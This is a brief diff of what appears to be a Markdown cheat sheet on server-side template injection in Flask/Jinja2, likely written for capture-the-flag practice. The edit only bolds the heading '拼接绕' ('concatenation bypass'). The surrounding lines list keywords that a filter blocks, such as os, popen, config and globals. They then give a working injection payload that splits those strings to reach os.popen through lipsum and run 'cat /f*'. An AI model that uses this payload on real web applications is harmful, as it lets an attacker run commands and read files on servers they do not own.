@@ -134,7 +134,7 @@ set,.， from, flask, request, os, import, subclasses,dict,
 globals, locals, self, config, app, popen, file, templates
 ```
 
-拼接绕
+**拼接绕**
 
 ```python
 &#123;&#123;lipsum['__glob'+'als__']['__bui'+'ltins__']['__imp'+'ort__']('o'+'s')['po'+'pen']('cat /f*')|attr('read')()&#125;&#125;
